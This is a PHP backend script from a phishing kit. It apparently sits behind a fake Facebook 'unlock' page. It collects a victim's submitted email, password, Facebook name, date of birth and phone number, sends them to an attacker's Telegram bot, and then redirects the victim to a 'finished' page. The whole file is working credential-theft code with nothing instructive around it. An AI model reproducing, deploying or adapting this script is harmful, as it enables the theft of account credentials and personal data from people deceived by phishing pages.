<?php 

include 'chatId.php';

function sendMessage($chatID, $messaggio, $token) {
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatID;
    $url = $url . "&text=" . urlencode($messaggio) . "&parse_mode=html";
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

$user = $_POST['user'];
$pass = $_POST['pass'];
$nama = $_POST['nama'];
$ttl = $_POST['ttl'];
$phone = $_POST['phone'];
$pesanas = 'Ressult AkangWeb | https://akangweb.online/ | ' . $user . PHP_EOL . PHP_EOL . '- Email: ' . $user . PHP_EOL . '- Password: ' . $pass . PHP_EOL . '- Nama FB: ' . $nama . PHP_EOL . '- Tanggal Lahir: ' . $ttl . PHP_EOL . '- No.HP: ' . $phone;
sendMessage($chatID, $pesanas, $botToken);

?>
<script LANGUAGE="JavaScript">
window.location="unlock-step/finished.php";
</script>

?>